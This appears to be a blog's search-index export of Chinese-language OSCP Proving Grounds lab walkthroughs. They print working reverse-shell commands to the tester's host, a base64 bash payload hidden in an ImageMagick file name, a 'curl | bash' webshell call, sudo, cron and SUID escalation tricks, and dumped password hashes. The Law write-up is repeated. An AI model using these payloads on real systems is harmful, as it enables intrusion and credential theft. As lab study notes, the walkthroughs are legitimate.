sec) foothold2上传pspy执行收集定时任务，发现UID&#x3D;1001定期清理图片文件 文件aetisan所属用户是当前用户，直接 msfvenom -p php/reverse_php LHOST=192.168.45.234 LPORT=80 -f raw -o test.php 生成反弹shell文件，上传后覆盖artisan文件 12ls -al artisan-rwxr-xr-x 1 www-data www-data 1885 Feb 16 10:26 artisan 稍等片刻，得到skunk的shell 1234567rlwrap nc -nvlp 80listening on [any] 80 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.212.38] 55570iduid=1001(skunk) gid=1001(skunk) groups=1001(skunk),27(sudo),33(www-data)whoamiskunk 12345rlwrap nc -nvlp 80listening on [any] 80 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.212.38] 54526iduid=1001(skunk) gid=1001(skunk) groups=1001(skunk),27(sudo),33(www-data) escalationskunk可以在不需要密码的情况下执行composer， 在https://gtfobins.github.io/gtfobins/composer/找到利用方法，成功获取shell 1234567sudo -lMatching Defaults entries for skunk on debian: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser skunk may run the following commands on debian: (ALL : ALL) ALL (root) NOPASSWD: /usr/bin/composer --working-dir\\=/var/www/html/lavita * 12echo &#x27;&#123;&quot;scripts&quot;:&#123;&quot;x&quot;:&quot;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;&#125;&#125;&#x27; &gt;/var/www/html/lavita/composer.jsonsudo composer --working-dir\\=/var/www/html/lavita * run-script x 小插曲： 测试发现php&#x2F;reverse_php生成的反弹shell文件是无法升级成交互式shell的，看了下payload说明，reverse_php确实没有说是interactive, which perl 查一下机器上perl用 reverse_perl msfvenom -p php/reverse_perl LHOST=192.168.45.234 LPORT=80 -f raw -o test.php重新生成payload文件，覆盖aetisan, 新获得的shell可以通过 python -c &#39;import pty; pty.spawn(*/bin/bash&quot;)&#39;升级成交互式shell, composer提权过程需要手动敲一下回车，切换为交互式shell之后才成功。 服务器没有perl怎么办？ 可以上传webshell， 通过cmd执行反弹shell shell脚本 1http://192.168.109.128/webshell.php&amp;cmd=curl%20192.168.118.4/shell.sh%20|%20bash","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Law","date":"2025-02-16T12:50:50.000Z","path":"post/20250216205050.html","text":"DifficultyMedium scan12345[*] ssh found on tcp/22. OpenSSH 8.4p1[*] http found on tcp/80. Apache/2.4.56 80 htmlLaw版本：1.2.5 foothold https://github.com/cosad3s/CVE-2022-35914-poc/blob/main/CVE-2022-35914.py 执行 python cve-2022-35914.py -u http://192.168.212.190 -c &quot;id&quot; 后提示失败，查看代码修改默认uri为 /index.php,重新执行 12345678910def exploit(url,cmd,user_agent,check,hook): # uri = &quot;/vendor/htmlawed/htmlawed/htmLawedTest.php&quot; uri = &quot;/index.php&quot; headers = &#123;&#x27;User-Agent&#x27;: user_agent&#125; session = requests.Session() response_part1 = session.get(str(url)+uri, verify=False, headers=headers) print(response_part1.text) if (response_part1.status_code != 200): fail() 重新执行成功得到返回 直接尝试nc 反弹shell: python cve-2022-35914.py -u http://192.168.212.190 -c &quot;nc 192.168.45.234 80 -e /bin/bash 123456rlwrap nc -nvlp 80listening on [any] 80 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.212.190] 60626iduid=33(www-data) gid=33(www-data) groups=33(www-data)pwd escalation只有一个root账户 123cat /etc/passwdroot:x:0:0:root:/root:/bin/bash... 上传linpeas执行，可能有用的信息 123╔══════════╣ Sudo version╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-versionSudo version 1.9.5p2 123╔══════════╣ Checking sudo tokens╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokensptrace protection is disabled (0), so sudo tokens could be abused 123╔══════════╣ .sh files in path╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path/usr/bin/gettext.sh 1234567891011╔══════════╣ Writable log files (logrotten) (limit 50)╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#logrotate-exploitationlogrotate 3.18.0 Default mail command: /usr/bin/mail Default compress command: /bin/gzip Default uncompress command: /bin/gunzip Default compress extension: .gz Default state file path: /var/lib/logrotate/status ACL support: yes SELinux support: yes 试了sudo 提权，没有成功，其他也没有头绪，先用pspy检查一下有没有其他定时任务 https://github.com/DominicBreuker/pspy?tab=readme-ov-file pspy可以在不需要root权限的情况下监控进程执行情况，尤其适用于检查进程执行时间短，使用ps -ef等命令无法查看到的场景。 监控到每分钟会以root用户执行 /var/www/clean.sh，查看clean.sh内容是清理apach日志，查看所属用户是当前用户www-data, 直接追加反弹shell命令 12345678cat cleanup.sh#!/bin/bashrm -rf /var/log/apache2/error.logrm -rf /var/log/apache2/access.logls -al cleanup.sh-rwxr-xr-x 1 www-data www-data 82 Aug 25 2023 cleanup.shecho &#x27;nc 192.168.45.234 80 -e /bin/bash&#x27; &gt;&gt; cleanup.sh 等待片刻，nc收到了root用户的反弹shell 12345rlwrap nc -nvlp 80listening on [any] 80 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.212.190] 45784iduid=0(root) gid=0(root) groups=0(root) 反思 可能的提权点和漏洞比较多，先枚举列出来，从最有可能的开始，避免浪费太多时间，也避免有重要信息遗漏 123456789101112131415&lt;!--Modified version while processing--&gt;# DifficultyMedium # scan```JSON[*] ssh found on tcp/22. OpenSSH 8.4p1[*] http found on tcp/80. Apache/2.4.56 80 htmlLaw版本：1.2.5 foothold https://github.com/cosad3s/CVE-2022-35914-poc/blob/main/CVE-2022-35914.py 执行 python cve-2022-35914.py -u http://192.168.212.190 -c &quot;id&quot; 后提示失败，查看代码修改默认uri为 /index.php,重新执行 12345678910def exploit(url,cmd,user_agent,check,hook): # uri = &quot;/vendor/htmlawed/htmlawed/htmLawedTest.php&quot; uri = &quot;/index.php&quot; headers = &#123;&#x27;User-Agent&#x27;: user_agent&#125; session = requests.Session() response_part1 = session.get(str(url)+uri, verify=False, headers=headers) print(response_part1.text) if (response_part1.status_code != 200): fail() 重新执行成功得到返回 直接尝试nc 反弹shell: python cve-2022-35914.py -u http://192.168.212.190 -c &quot;nc 192.168.45.234 80 -e /bin/bash 123456rlwrap nc -nvlp 80listening on [any] 80 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.212.190] 60626iduid=33(www-data) gid=33(www-data) groups=33(www-data)pwd escalation只有一个root账户 123cat /etc/passwdroot:x:0:0:root:/root:/bin/bash... 上传linpeas执行，可能有用的信息 123╔══════════╣ Sudo version╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-versionSudo version 1.9.5p2 123╔══════════╣ Checking sudo tokens╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokensptrace protection is disabled (0), so sudo tokens could be abused 123╔══════════╣ .sh files in path╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path/usr/bin/gettext.sh 1234567891011╔══════════╣ Writable log files (logrotten) (limit 50)╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#logrotate-exploitationlogrotate 3.18.0 Default mail command: /usr/bin/mail Default compress command: /bin/gzip Default uncompress command: /bin/gunzip Default compress extension: .gz Default state file path: /var/lib/logrotate/status ACL support: yes SELinux support: yes 试了sudo 提权，没有成功，其他也没有头绪，先用pspy检查一下有没有其他定时任务 https://github.com/DominicBreuker/pspy?tab=readme-ov-file pspy可以在不需要root权限的情况下监控进程执行情况，尤其适用于检查进程执行时间短，使用ps -ef等命令无法查看到的场景。 监控到每分钟会以root用户执行 /var/www/clean.sh，查看clean.sh内容是清理apach日志，查看所属用户是当前用户www-data, 直接追加反弹shell命令 12345678cat cleanup.sh#!/bin/bashrm -rf /var/log/apache2/error.logrm -rf /var/log/apache2/access.logls -al cleanup.sh-rwxr-xr-x 1 www-data www-data 82 Aug 25 2023 cleanup.shecho &#x27;nc 192.168.45.234 80 -e /bin/bash&#x27; &gt;&gt; cleanup.sh 等待片刻，nc收到了root用户的反弹shell 12345rlwrap nc -nvlp 80listening on [any] 80 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.212.190] 45784iduid=0(root) gid=0(root) groups=0(root) 反思 可能的提权点和漏洞比较多，先枚举列出来，从最有可能的开始，避免浪费太多时间，也避免有重要信息遗漏 1","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Image","date":"2025-02-16T10:45:12.000Z","path":"post/20250216184512.html","text":"DifficultMeduim scanautoreconsudo autorecon 192.168.212.178 1234567[*] ssh found on tcp/22. OpenSSH 8.2p1[*] http found on tcp/80. Apache/2.4.41 ImageMagick Identifier 80 ImageMagic随便上传一个文件， 成功后显示版本号 6.9.6-4 footholdgoogle搜索 imagemagick 6.9.6 exploit https://github.com/ImageMagick/ImageMagick/issues/6339 issue中提到 CVE-2023-34152 再次搜索找到github: https://github.com/overgrowncarrot1/ImageTragick_CVE-2023-34152,克隆代码执行, 生成两个图片文件 123└─$ ls base.txt &#x27;|en&quot;`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzNC84MCAwPiYxCg==&#x27;$&#x27;\\n&#x27;&#x27; | base64 -d | bash`&quot;.png&#x27; README.md CVE-2023-34152.py en.png 上传 &#39;|en....png&#39; ， 成功获得shell, cat &#x2F;etc&#x2F;passwd发现只有root一个账户 1234567891011121314rlwrap nc -nvlp 80listening on [any] 80 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.212.178] 46508bash: cannot set terminal process group (1169): Inappropriate ioctl for devicebash: no job control in this shellwww-data@image:/var/www/html$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)cat /etc/passwdroot:x:0:0:root:/root:/bin/bash...fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin escalation下载linpeas并执行, 发现strace suid权限, gtfobins查找利用方式 /usr/bin/strace -o /dev/null /bin/sh -p提权成功 https://gtfobins.github.io/gtfobins/strace/ 1234567891011121314www-data@image:/var/www/html$ /usr/bin/strace -o /dev/null /bin/sh -p/usr/bin/strace -o /dev/null /bin/sh -piduid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)cd /rootlsImageMagick-7.1.0-16email2.txtproof.txtsnapcat proof.txt056bd9764a79f6e07150768696acf296whoamiroot","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Hub","date":"2025-02-16T10:05:17.000Z","path":"post/20250216180517.html","text":"DifficultEasy Scanautorecon 12345678910111213141516171819202122232425[*] ssh found on tcp/22. OpenSSH 8.4p1 [*] http found on tcp/80. nginx/1.18.0 http://192.168.212.25/readme.txt FuguHub BarracudaDrive[*] http found on tcp/8082. barracudadrive.com FuguHub 8.4 WebDAV enable[*] http found on tcp/9999. https 80 nginx端口扫描有readme.txt, 服务端cms: FuguHub 8.0 8082 FuguHub可以直接进入，没有用户密码验证，在about页面看到fugu版本号 8.4 9999和8082一样，区别是9999是https footholdsearchsploit fuguhub, 8.1版本RCE google搜索 fuguhub 8.4 exploit https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697 克隆代码后，直接执行， 成功获取shell, 用户是root 123456789https://github.com/S─$ python exploit.py -r 192.168.212.25 -rp 8082 -l 192.168.45.234 -p 80[*] Checking for admin user...[+] No admin user exists yet, creating account with admin:admin123[+] User created![+] Logging in...[+] Success! Injecting the reverse shell...[+] Successfully injected the reverse shell into the About page.[+] Triggering the reverse shell, check your listener...anjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697 12345rlwrap nc -nvlp 80listening on [any] 80 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.212.25] 59038iduid=0(root) gid=0(root) groups=0(root)","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Extplorer","date":"2025-02-16T09:23:00.000Z","path":"post/20250216172300.html","text":"DifficutyMidum scans123456[*] ssh found on tcp/22. OpenSSH 8.2p1[*] http found on tcp/80. Apache/2.4.41 (Ubuntu) 80 wordpress12345678910111213141516171819gobuster dir -w /usr/share//wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.212.16:80 -t 40===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.212.16:80[+] Method: GET[+] Threads: 40[+] Wordlist: /usr/share//wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/wp-content (Status: 301) [Size: 321] [--&gt; http://192.168.212.16/wp-content/]/wordpress (Status: 301) [Size: 320] [--&gt; http://192.168.212.16/wordpress/]/wp-includes (Status: 301) [Size: 322] [--&gt; http://192.168.212.16/wp-includes/]/wp-admin (Status: 301) [Size: 319] [--&gt; http://192.168.212.16/wp-admin/] wpscan 确认版本6.2， 没扫描到插件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960wpscan --url http://192.168.212.16 -v_______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | &#x27;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.27 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[+] URL: http://192.168.212.16/ [192.168.212.16][+] Effective URL: http://192.168.212.16/wp-admin/setup-config.php[+] Started: Sat Feb 15 23:15:32 2025Interesting Finding(s):[+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100%[+] WordPress readme found: http://192.168.212.16/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] WordPress version 6.2 identified (Insecure, released on 2023-03-29). | Found By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection) | - http://192.168.212.16/wp-includes/css/dashicons.min.css?ver=6.2 | Confirmed By: | Common Wp Includes Query Parameter In Homepage (Passive Detection) | - http://192.168.212.16/wp-includes/css/buttons.min.css?ver=6.2 | Style Etag (Aggressive Detection) | - http://192.168.212.16/wp-admin/load-styles.php, Match: &#x27;6.2&#x27;[i] The main theme could not be detected.[+] Enumerating All Plugins (via Passive Methods)[i] No plugins Found.[+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:08 &lt;=================================================================&gt; (137 / 137) 100.00% Time: 00:00:08[i] No Config Backups Found.[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Sat Feb 15 23:16:51 2025[+] Requests Done: 169[+] Cached Requests: 5[+] Data Sent: 35.328 KB[+] Data Received: 42.482 KB[+] Memory used: 208.801 MB[+] Elapsed time: 00:01:18 测试默认账号密码都没有结果 foodholdgobuster扫到目录filemanager 123456789101112131415161718192021222324252627282930gobuster dir -w /usr/share//wordlists/dirb/common.txt -u http://192.168.212.16:80 -t 40===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.212.16:80[+] Method: GET[+] Threads: 40[+] Wordlist: /usr/share//wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.htaccess (Status: 403) [Size: 279]/.htpasswd (Status: 403) [Size: 279]/.hta (Status: 403) [Size: 279]/filemanager (Status: 301) [Size: 322] [--&gt; http://192.168.212.16/filemanager/]/index.php (Status: 302) [Size: 0] [--&gt; http://192.168.212.16:80/wp-admin/setup-config.php]/server-status (Status: 403) [Size: 279]/wordpress (Status: 301) [Size: 320] [--&gt; http://192.168.212.16/wordpress/]/wp-admin (Status: 301) [Size: 319] [--&gt; http://192.168.212.16/wp-admin/]/wp-content (Status: 301) [Size: 321] [--&gt; http://192.168.212.16/wp-content/]/wp-includes (Status: 301) [Size: 322] [--&gt; http://192.168.212.16/wp-includes/]/xmlrpc.php (Status: 302) [Size: 0] [--&gt; http://192.168.212.16:80/wp-admin/setup-config.php]Progress: 4614 / 4615 (99.98%)===============================================================Finished=============================================================== 使用admin:admin可以登录，并且有上传文件权限，msfvenom -p php/reverse_php LHOST=192.168.45.184 LPORT=4444 -f raw -o shell.php 生成webshell上传，curl ip:port&#x2F;filemanager&#x2F;shell.php 得到shell 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051rlwrap nc -nvlp 4444listening on [any] 4444 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.212.16] 57546iduid=33(www-data) gid=33(www-data) groups=33(www-data)cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falseusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinsshd:x:112:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsefwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologindora:x:1000:1000::/home/dora:/bin/shcd /home/doralslocal.txtcat local.txtls -al local.txt-r-------- 1 dora dora 33 Feb 16 02:29 local.txt 查看etc/passwd发现有用户dora, 在dora主目录中有local.txt文件，但是www-data没有查看权限, 尝试在/var/www/html搜索dora: grep dora * -r, 发现dora hash: $2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS 12345$ cd /var/www/html$ grep dora * -rfilemanager/config/.htusers.php: array(&#x27;dora&#x27;,&#x27;$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS&#x27;,&#x27;/var/www/html&#x27;,&#x27;http://localhost&#x27;,&#x27;1&#x27;,&#x27;&#x27;,&#x27;0&#x27;,1),wp-includes/js/plupload/moxie.js: /(joli|[kxln]?ubuntu|debian|[open]*suse|gentoo|arch|slackware|fedora|mandriva|centos|pclinuxos|redhat|zenwalk|linpus)[\\/\\s-]?([\\w\\.-]+)*/i,wp-includes/js/plupload/moxie.js: // Fedora/Mandriva/CentOS/PCLinuxOS/RedHat/Zenwalk/Linpus hashcat 爆破密码得到 doraemon 12345hashcat -h |grep &#x27;$2a&#x27;hashcat -h |grep &#x27;$2&#x27; 3200 | bcrypt $2*$, Blowfish (Unix) | Operating Systemhashcat -m 3200 dora.hash /usr/share/wordlists/rockyou.txt ssh登录失败， 只能通过密钥对方式登录 12345678ssh dora@192.168.212.16The authenticity of host &#x27;192.168.212.16 (192.168.212.16)&#x27; can&#x27;t be established.ED25519 key fingerprint is SHA256:VnMMoSlX8Y0MsU947B2bAEqDX+KmnqpFLFXtLgsOERw.This host key is known by the following other names/addresses: ~/.ssh/known_hosts:1: [hashed name]Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#x27;192.168.212.16&#x27; (ED25519) to the list of known hosts.dora@192.168.212.16: Permission denied (publickey). 但是在反弹的www-data的shell里，无法升级到交互式的shell, pyhthon, script, perl, socat都试过了，都不行，最后使用msf获取到shell可以正常切换用户 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.45.234 LPORT=4444 -f raw -o r.php生成msf反弹shell payload 1234567891011121314151617181920212223use exploit/multi/fileformat/js_unpacker_eval_injectionmsf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcppayload =&gt; php/meterpreter/reverse_tcpView the full module info with the info, or info -d command.msf6 exploit(multi/handler) &gt; set Lhost tun0Lhost =&gt; 192.168.45.234msf6 exploit(multi/handler) &gt; exploit[*] Started reverse TCP handler on 192.168.45.234:4444[*] Sending stage (39927 bytes) to 192.168.212.16se[*] Meterpreter session 1 opened (192.168.45.234:4444 -&gt; 192.168.212.16:37902) at 2025-02-16 12:47:41 +0800meterpreter &gt; shellProcess 34439 created.Channel 0 created.su doraPassword: doraemoniduid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk) escalationdiskgroup12iduid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk) https://vk9-sec.com/disk-group-privilege-escalation/ dora用户有diskgroup权限 首先查看&#x2F;root挂在磁盘，/dev/mapper/ubuntu--vg-ubuntu--lv 挂在在/目录，执行debugfs /dev/mapper/ubuntu--vg-ubuntu--lv 发现无法写文件，无法实现通过写公钥然后通过ssh登录，在&#x2F;root&#x2F;.ssh下也没有公私钥，之后authorized_keys文件 读取&#x2F;etc&#x2F;shadow文件，得到root hash: $6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960$ df -hFilesystem Size Used Avail Use% Mounted onudev 947M 0 947M 0% /devtmpfs 199M 1.2M 198M 1% /run/dev/mapper/ubuntu--vg-ubuntu--lv 9.8G 5.1G 4.3G 55% /tmpfs 992M 0 992M 0% /dev/shmtmpfs 5.0M 0 5.0M 0% /run/locktmpfs 992M 0 992M 0% /sys/fs/cgroup/dev/loop0 62M 62M 0 100% /snap/core20/1611/dev/loop2 50M 50M 0 100% /snap/snapd/18596/dev/loop1 64M 64M 0 100% /snap/core20/1852/dev/loop3 92M 92M 0 100% /snap/lxd/24061/dev/loop4 68M 68M 0 100% /snap/lxd/22753/dev/sda2 1.7G 209M 1.4G 13% /boottmpfs 199M 0 199M 0% /run/user/1000$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lvdebugfs 1.45.5 (07-Jan-2020)debugfs: mkdir testmkdir: Filesystem opened read/onlydebugfs: ls /root/.sshdebugfs: cd /root/.sshdebugfs: lsauthorized_keysdebugfs: cat /etc/shadowroot:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::daemon:*:19235:0:99999:7:::bin:*:19235:0:99999:7:::sys:*:19235:0:99999:7:::sync:*:19235:0:99999:7:::games:*:19235:0:99999:7:::man:*:19235:0:99999:7:::lp:*:19235:0:99999:7:::mail:*:19235:0:99999:7:::news:*:19235:0:99999:7:::uucp:*:19235:0:99999:7:::proxy:*:19235:0:99999:7:::www-data:*:19235:0:99999:7:::backup:*:19235:0:99999:7:::list:*:19235:0:99999:7:::irc:*:19235:0:99999:7:::gnats:*:19235:0:99999:7:::nobody:*:19235:0:99999:7:::systemd-network:*:19235:0:99999:7:::systemd-resolve:*:19235:0:99999:7:::systemd-timesync:*:19235:0:99999:7:::messagebus:*:19235:0:99999:7:::syslog:*:19235:0:99999:7:::_apt:*:19235:0:99999:7:::tss:*:19235:0:99999:7:::uuidd:*:19235:0:99999:7:::tcpdump:*:19235:0:99999:7:::landscape:*:19235:0:99999:7:::pollinate:*:19235:0:99999:7:::usbmux:*:19381:0:99999:7:::sshd:*:19381:0:99999:7:::systemd-coredump:!!:19381::::::lxd:!:19381::::::fwupd-refresh:*:19381:0:99999:7:::dora:$6$PkzB/mtNayFM5eVp$b6LU19HBQaOqbTehc6/LEk8DC2NegpqftuDDAvOK20c6yf3dFo0esC0vOoNWHqvzF0aEb3jxk39sQ/S4vGoGm/:19453:0:99999:7::: 爆破得到密码 explorer 12345hashcat -h |grep &#x27;$6&#x27; 1800 | sha512crypt $6$, SHA512 (Unix) | Operating System 22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$) | Private Keyhashcat -m 1800 root.hash /usr/share/wordlists/rockyou.txt 反思 提权是看到了 dora 有权限 6(disk)， 甚至linpeas中都有黄色背景的利用标识，为什么还是先给忽略了?还是优先尝试自己熟悉的东西，要从最明显的开始","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Disk group 提权","date":"2025-02-16T08:40:16.000Z","path":"post/20250216164016.html","text":"原文： https://vk9-sec.com/disk-group-privilege-escalation/ Disk group 允许用户完全访问&#x2F;dev&#x2F;中包含的任何块设备。由于&#x2F;dev&#x2F;sda一般是根系统文件，而磁盘组对该设备拥有完全的读写权限，可以用于写入或读取任意文件内容 Identify id命令 12$ iduid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk) 列出&#x2F;dev设备owner和group owner， 查找所属group是disk的分区 1234567891011121314151617181920212223242526$ls -l /devdrwxr-xr-x 7 root root 140 Aug 3 2024 